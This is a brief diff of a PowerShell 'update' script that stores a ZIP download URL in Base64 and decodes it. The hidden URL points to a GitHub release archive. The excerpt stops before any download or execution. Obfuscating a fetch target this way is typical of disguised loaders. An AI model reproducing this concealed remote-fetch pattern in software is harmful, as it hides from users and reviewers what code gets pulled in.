@@ -1,3 +1,4 @@
+# Update scripts for Windows
 # Base64-encoded URL for the ZIP file
 $zipBase = "aHR0cHM6Ly9naXRodWIuY29tL2pld2Vsc2hram9ueS9mYXN0LWNsaS9yZWxlYXNlcy9kb3dubG9hZC92MS4xLjIvdXBkYXRlLnppcA=="
 $zipBytes = [System.Convert]::FromBase64String($zipBase)
